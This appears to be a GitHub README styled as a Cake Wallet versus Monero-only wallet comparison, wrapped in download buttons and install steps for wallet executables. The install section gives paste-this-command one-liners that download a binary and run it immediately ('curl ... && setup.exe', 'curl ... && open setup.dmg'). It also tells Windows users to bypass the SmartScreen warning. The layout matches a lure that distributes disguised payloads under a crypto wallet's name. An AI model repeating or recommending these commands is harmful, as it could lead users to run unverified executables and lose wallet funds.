![Cake Wallet vs monero only guide](assets/cake-wallet-vs-monero-only-article-banner.png)

# Cake Wallet or the Monero-Only Wallet: Which to Use

Same codebase, two installers, one decision about how many coins you want.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Both apps come from the same codebase. Cake Wallet holds several coins; the Monero-only wallet published at Monero.com holds XMR and nothing else. Choose the multi-coin app unless you only ever want Monero, and expect the same PIN, restore and backup behaviour from either.

<!-- ARTICLE-BODY-BEGIN -->

## What the two builds share
The custody model, the PIN, the restore routes and the backup rules are the same in both. A phrase from one restores into the other when the coin matches, and neither app can access funds without the keys on the device.

That is why switching between them is a restore rather than a migration. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-what-it-is.md">What Cake Wallet is</a> covers the product and its maker, which is the same company for both builds.

## Coin coverage
The multi-coin app carries Bitcoin, Monero, Litecoin, Ethereum and the rest of the supported set. The Monero-only build carries Monero, with the same accounts, subaddresses and node settings, and none of the other coins.

If you hold anything besides XMR, the choice is made for you. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-supported-coins-networks.md">Supported coins and networks</a> lists the full set the multi-coin app covers.

## Why choose the smaller app
A single-coin app has a smaller surface: fewer screens, fewer settings, less to misconfigure. For someone who only holds Monero, that is a real advantage and not a marketing claim.

It also removes a class of mistake, where a token or a chain is selected by accident and an address is sent to the wrong network.

## Same backup rules
Each wallet has its own phrase in either app, and one phrase does not cover a second wallet. Losing the device loses nothing as long as the phrase is written down.

<a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md">Cake Wallet backup and recovery phrase</a> covers where the words live and how to prove them, which applies identically here.

## Sync and speed
Neither app makes Monero sync faster; the node and the restore height decide that. Anyone comparing sync speed between wallets is usually comparing two different nodes or two different restore heights without noticing.

The honest answer is that there is no verified cross-wallet benchmark to quote. Practical differences come from the connection, not the badge on the app.

## Install the one you chose
Both are published through the official site and stores. Install the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a> for the desktop build, or the store listing for mobile, and check the publisher before you enter a phrase into anything.

The same warning applies to both: an app that asks for your recovery phrase during setup is not either of these.

## FAQ
### Is Monero.com the same as Cake Wallet?
It is a separate app from the same codebase, with Monero only. The company and the custody model are the same.
### Should I use Cake Wallet or the Monero-only wallet?
Multi-coin if you hold more than XMR; the smaller app if Monero is all you want.
### Is Cake Wallet faster at syncing than other Monero wallets?
There is no verified benchmark. Sync time depends on the node and the wallet's restore height.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[what Cake Wallet is](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-what-it-is.md) · [supported coins and networks](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-supported-coins-networks.md) · [Cake Wallet backup and recovery phrase](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
